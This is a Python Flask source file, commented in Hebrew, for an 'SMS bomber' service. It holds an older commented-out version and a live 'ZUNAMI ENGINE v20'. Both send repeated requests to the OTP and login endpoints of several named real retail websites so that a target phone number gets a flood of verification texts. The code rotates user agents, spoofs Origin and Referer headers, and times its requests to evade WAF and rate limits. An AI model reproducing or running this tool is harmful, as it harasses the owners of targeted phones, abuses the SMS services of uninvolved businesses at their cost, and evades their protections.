

# import concurrent.futures
# import requests
# import random
# import time
# import os
# from flask import Flask, jsonify, request
# from flask_cors import CORS

# app = Flask(__name__)
# # מאפשר לאפליקציית ה-Lovable שלך לגשת ל-API ללא חסימות אבטחה
# CORS(app)

# # רשימת ה-8 המנצחים שאישרת שעובדים ב-100%
# SITES = [
#     {"name": "Femina", "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "type": "json", "body": {"phone": "{phone}"}},
#     {"name": "Housemen", "url": "https://housemen.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=simply-check-member-cellphone&cellphone={phone}"},
#     {"name": "Spices", "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=validate_user_by_sms&phone={phone}"},
#     {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "type": "json", "body": {"value": "{phone}", "type": "phone", "projectId": "1"}},
#     {"name": "Naot", "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json", "body": {"phoneNumber": "{phone}"}},
#     {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
#     {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
#     {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "type": "json", "body": {"phoneNumber": "{phone}", "sourceFrom": "desktopHomePage"}}
# ]

# def send_burst(node, phone, repeats=7):
#     """מבצע שליחה חוזרת מאותו אתר עם השהיה למניעת חסימה"""
#     session = requests.Session()
#     headers = {
#         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
#         "Accept": "*/*",
#         "X-Requested-With": "XMLHttpRequest"
#     }

#     for i in range(repeats):
#         try:
#             if node["type"] == "json":
#                 headers["Content-Type"] = "application/json"
#                 payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v for k, v in node["body"].items()}
#                 res = session.post(node["url"], json=payload, headers=headers, timeout=10)
#             else:
#                 headers["Content-Type"] = "application/x-www-form-urlencoded"
#                 payload = node["body"].replace("{phone}", phone)
#                 res = session.post(node["url"], data=payload, headers=headers, timeout=10)
            
#             print(f"[*] {node['name']} ({i+1}/7): {res.status_code}")
#             time.sleep(random.uniform(5, 8)) 
            
#         except Exception as e:
#             print(f"[!] Error in {node['name']}: {e}")
#             break

# @app.route('/', methods=['GET', 'HEAD'])
# def health_check():
#     """נתיב שמוודא שהשרת חי (מונע שגיאות 404 ב-Render)"""
#     return jsonify({"status": "online", "message": "SMS Titan is running"}), 200

# @app.route('/launch', methods=['POST'])
# def launch():
#     """הנתיב המרכזי שמקבל את מספר הטלפון ומפעיל את המערכת"""
#     data = request.get_json()
#     target = data.get('phone') if data else None
    
#     if not target:
#         return jsonify({"status": "error", "message": "No phone number provided"}), 400

#     print(f"\n--- INITIATING 56-SMS ATTACK ON {target} ---\n")
    
#     # הפעלה מקבילית של ה-Threads
#     with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
#         for node in SITES:
#             executor.submit(send_burst, node, target)
            
#     return jsonify({"status": "success", "target": target})

# if __name__ == '__main__':
#     # הגדרות חובה עבור Render
#     port = int(os.environ.get("PORT", 5000))
#     app.run(host='0.0.0.0', port=port)

import concurrent.futures
import requests
import random
import time
import os
from datetime import datetime
from flask import Flask, jsonify, request
from flask_cors import CORS

# --- הגדרות צבעים לטרמינל ---
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

app = Flask(__name__)
CORS(app) # מאפשר ל-Lovable לתקשר עם השרת

# --- הגדרות מערכת ---
BURST_PER_SITE = 10  # כמות סמסים מכל אתר
is_attacking = False # דגל שליטה (Kill Switch)

# --- רשימת אתרים מעודכנת (טרף קל) ---
SITES = [
    {"name": "Naot",       "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json", "body": {"phoneNumber": "{phone}"}},
    {"name": "CrazyLine",  "url": "https://www.crazyline.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
    {"name": "Housemen",   "url": "https://housemen.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=simply-check-member-cellphone&cellphone={phone}"},
    {"name": "Spices",     "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=validate_user_by_sms&phone={phone}"},
    {"name": "Urbanica",   "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
    {"name": "Femina",     "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "type": "json", "body": {"phone": "{phone}"}},
    {"name": "Paneco",     "url": "https://www.paneco.co.il/customer/account/loginPost/", "type": "form", "body": "login[username]={phone}"},
]

def get_dynamic_headers(site_url):
    """מייצר זהות דפדפן ייחודית לכל בקשה"""
    user_agents = [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    ]
    
    base_domain = site_url.rsplit('/', 3)[0]
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": base_domain,
        "Referer": base_domain + "/",
        "Cache-Control": "no-cache"
    }

def log(msg, color=Colors.RESET):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{ts}] {msg}{Colors.RESET}")

def execute_ultra_burst(site, phone):
    """מנגנון השליחה המתוחכם לכל אתר"""
    global is_attacking
    success_count = 0
    session = requests.Session() # שימוש ב-Session לכל אתר לשמירת Cookies
    
    for i in range(BURST_PER_SITE):
        if not is_attacking:
            log(f"🛑 Stopping burst for {site['name']}...", Colors.YELLOW)
            break
            
        try:
            headers = get_dynamic_headers(site["url"])
            
            if site["type"] == "json":
                headers["Content-Type"] = "application/json"
                payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v for k, v in site["body"].items()}
                resp = session.post(site["url"], json=payload, headers=headers, timeout=10)
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                payload = site["body"].replace("{phone}", phone)
                resp = session.post(site["url"], data=payload, headers=headers, timeout=10)

            if resp.status_code in (200, 201, 202, 204):
                success_count += 1
                log(f"🔥 {site['name']:12} | SMS {i+1}/{BURST_PER_SITE} SENT", Colors.GREEN)
            else:
                log(f"⚠️ {site['name']:12} | SMS {i+1} BLOCKED ({resp.status_code})", Colors.YELLOW)
                if resp.status_code == 429: # Rate Limit
                    time.sleep(3) 

            # השהיית מיקרו חכמה לעקיפת WAF
            time.sleep(random.uniform(1.2, 1.9))

        except Exception as e:
            log(f"❌ {site['name']:12} | Error: {str(e)[:30]}", Colors.RED)
            time.sleep(2)
            
    return success_count

# --- API Endpoints ---

@app.route('/stop', methods=['POST'])
def stop():
    global is_attacking
    is_attacking = False
    log("!!! EMERGENCY STOP TRIGGERED BY USER !!!", Colors.RED)
    return jsonify({"status": "stopped", "message": "Attack termination signal sent"})

@app.route('/launch', methods=['POST'])
def launch():
    global is_attacking
    data = request.get_json() or {}
    phone = data.get('phone')

    if not phone:
        return jsonify({"error": "No phone number provided"}), 400

    is_attacking = True
    total_sites = len(SITES)
    expected_sms = total_sites * BURST_PER_SITE

    log(f"--- STARTING ULTRA BURST: {expected_sms} SMS ON {phone} ---", Colors.CYAN)

    total_success = 0
    # שימוש ב-4 עובדים כדי לא להציף את ה-CPU ולשמור על יציבות
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        results = list(executor.map(lambda s: execute_ultra_burst(s, phone), SITES))
        total_success = sum(results)

    is_attacking = False
    log(f"--- ATTACK COMPLETED: {total_success}/{expected_sms} SUCCESSFUL ---", Colors.CYAN)
    
    return jsonify({
        "status": "completed",
        "phone": phone,
        "sent": total_success,
        "total_attempted": expected_sms
    })

if __name__ == '__main__':
    # מותאם להרצה על Render או מקומית
    port = int(os.environ.get("PORT", 5000))
    log(f"ZUNAMI ENGINE v20 READY ON PORT {port}", Colors.BOLD + Colors.GREEN)
    app.run(host='0.0.0.0', port=port, debug=False)